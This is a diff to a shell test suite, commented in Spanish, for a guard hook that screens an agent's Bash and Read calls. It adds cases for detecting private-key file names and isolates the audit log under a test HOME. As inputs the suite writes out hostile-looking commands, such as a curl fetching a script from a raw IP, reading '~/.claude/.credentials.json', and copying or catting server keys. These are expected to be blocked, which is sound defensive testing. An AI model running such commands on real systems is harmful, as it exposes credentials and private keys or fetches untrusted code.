@@ -28,7 +28,9 @@ mkdir -p "$GUARDS_TEST_HOME/.claude"
 jq '{permissions: {deny: (.permissions.deny // [])}}' "$KIT/claude/settings.json" \
   > "$GUARDS_TEST_HOME/.claude/settings.json"
 
-run_sentinel() { printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$1" | "$PY" "$KIT/sentinel/sentinel_preflight.py" 2>&1; }
+# HOME de prueba tambien aqui: cada deny se apunta en $HOME/.claude/audit-logs/sentinel.jsonl, y con
+# el HOME real la suite inflaba el recuento diario de denegaciones del log de quien la corre.
+run_sentinel() { jq -nc --arg c "$1" '{tool_name:"Bash",tool_input:{command:$c}}' | HOME="$GUARDS_TEST_HOME" "$PY" "$KIT/sentinel/sentinel_preflight.py" 2>&1; }
 run_smart()    { printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$1" | HOME="$GUARDS_TEST_HOME" "$PY" "$KIT/claude/hooks/smart_approve.py" 2>&1; }
 expect() { # $1 desc, $2 salida, $3 BLOCK|ALLOW
   if [ "$3" = BLOCK ]; then echo "$2" | grep -qiE 'deny|blocked' && r=OK || r=FAIL
@@ -54,6 +56,26 @@ expect "IP publica ($([ "$IOCS_WANT" = BLOCK ] && echo con || echo sin) iocs.jso
   "$(run_sentinel 'curl http://185.220.101.5/x.sh')" "$IOCS_WANT"
 expect "credentials ($([ "$IOCS_WANT" = BLOCK ] && echo con || echo sin) iocs.json)" \
   "$(run_sentinel 'cat ~/.claude/.credentials.json')" "$IOCS_WANT"
+
+# Ficheros de clave por NOMBRE: la regex exige un nombre de fichero delante de la extension
+# (inicio, espacio, comilla, = o /) y un final de nombre detras. Solo con el lookahead de detras,
+# un filtro jq sobre un campo `key` o la prosa que nombra la extension se denegaban: 245 deny en un
+# dia medido en la instalacion real. Los ALLOW son esos falsos positivos; los BLOCK, el contrapeso.
+expect "clave: ruta absoluta denegada"           "$(run_sentinel 'cp /etc/ssl/private/server.key /srv/x')" "$IOCS_WANT"
+expect "clave: entre comillas dobles denegada"   "$(run_sentinel 'openssl rsa -in "/ruta/x.key" -check')"  "$IOCS_WANT"
+expect "clave: nombre a secas denegado"          "$(run_sentinel 'cat server.key')"                        "$IOCS_WANT"
+expect "clave: .pem a secas denegado"            "$(run_sentinel 'openssl x509 -in foo.pem -noout')"       "$IOCS_WANT"
+expect "clave: .keystore denegado"               "$(run_sentinel 'keytool -list -keystore=app.keystore')"  "$IOCS_WANT"
+# shellcheck disable=SC2016  # el $(...) va literal: es el comando que se evalua
+expect "clave: dentro de \$( ) denegada"         "$(run_sentinel 'echo $(cat tls.key)')"                   "$IOCS_WANT"
+expect "clave: Read por file_path denegado" "$(jq -nc '{tool_name:"Read",tool_input:{file_path:"/srv/tls/server.key"}}' \
+  | HOME="$GUARDS_TEST_HOME" "$PY" "$KIT/sentinel/sentinel_preflight.py" 2>&1)" "$IOCS_WANT"
+expect "jq to_entries[].key permitido"           "$(run_sentinel "jq -r 'to_entries[].key' f.json")"       ALLOW
+expect "jq .key | permitido"                     "$(run_sentinel "jq '.key | ascii_downcase' f.json")"     ALLOW
+expect "jq (.key) y [.key] permitidos"           "$(run_sentinel "jq '[.items[] | (.key)] + [.key]' f.json")" ALLOW
+expect "jq .data.key permitido"                  "$(run_sentinel "jq -r '.data.key' f.json")"              ALLOW
+expect "prosa con .key y .pem permitida"         "$(run_sentinel "echo 'la extension .key, o un .pem, son claves'")" ALLOW
+expect "identificador foo.keys permitido"        "$(run_sentinel 'grep -n foo.keys src/')"                 ALLOW
 expect "force push directo denegado"   "$(run_smart 'git push --force origin main')"         BLOCK
 expect "force push compuesto denegado" "$(run_smart 'echo ok && git push -f origin main')"   BLOCK
 expect "comando normal en smart"       "$(run_smart 'git status')"                           ALLOW
